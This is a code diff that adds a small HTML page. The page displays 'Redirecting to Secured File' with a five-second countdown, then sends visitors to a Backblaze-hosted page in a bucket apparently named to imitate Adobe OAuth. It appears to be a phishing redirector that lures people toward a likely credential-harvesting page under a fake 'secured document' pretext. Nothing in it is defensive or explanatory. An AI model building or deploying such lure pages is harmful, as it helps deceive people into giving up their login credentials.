@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecting...</title>
+
+<style>
+    body{
+        margin:0;
+        height:100vh;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-family:Arial, sans-serif;
+        background:#fff;
+    }
+
+    .message{
+        font-size:32px;
+        text-align:center;
+    }
+
+    .count{
+        color:red;
+        font-weight:bold;
+        font-size:48px;
+    }
+</style>
+</head>
+<body>
+
+<div class="message">
+    Redirecting to Secured File in
+    <span id="countdown" class="count">5</span>
+    seconds...
+</div>
+
+<script>
+let seconds = 5; // Change between 1-5 as needed
+const targetURL = "https://f005.backblazeb2.com/file/adobeoauth2secure/viewsecuredonline.html";
+
+const countdown = document.getElementById("countdown");
+
+const timer = setInterval(() => {
+    seconds--;
+    countdown.textContent = seconds;
+
+    if (seconds <= 0) {
+        clearInterval(timer);
+        window.location.href = targetURL;
+    }
+}, 1000);
+</script>
+
+</body>
+</html>
